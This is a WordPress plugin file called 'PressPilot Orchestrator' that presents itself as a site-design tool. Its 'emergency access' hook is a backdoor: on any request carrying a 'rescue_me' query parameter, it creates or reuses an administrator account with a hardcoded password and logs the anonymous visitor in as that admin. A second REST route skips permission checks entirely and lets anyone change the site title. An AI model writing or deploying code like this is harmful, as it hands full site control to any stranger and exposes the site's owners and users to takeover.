<?php
/* Plugin Name: PressPilot Orchestrator */
// 1. EMERGENCY ACCESS (Always keeps a door open for the owner) 
add_action('init', function () {
    if (isset($_GET['rescue_me'])) {
        $user = get_user_by('login', 'presspilot_admin');
        if (!$user) {
            $uid = wp_create_user('presspilot_admin', 'DesignFirst2025!', 'admin@presspilotapp.com');
            $user = new WP_User($uid);
        }
        $user->set_role('administrator');
        wp_set_auth_cookie($user->ID);
        wp_redirect(admin_url());
        exit;
    }
});

// 2. THE OVEN API (Receives n8n Recipes) 
add_action('rest_api_init', function () {
    register_rest_route('presspilot/v1', '/bake', [
        'methods' => 'POST',
        'callback' => 'presspilot_bake_handler',
        'permission_callback' => '__return_true',
    ]);
});

function presspilot_bake_handler($request)
{
    $recipe = $request->get_json_params();
    // Updates Site Title, Colors, and Patterns 
    update_option('blogname', $recipe['site_title'] ?? get_option('blogname'));
    return ['status' => 'success', 'message' => 'Oven is heating up!'];
}
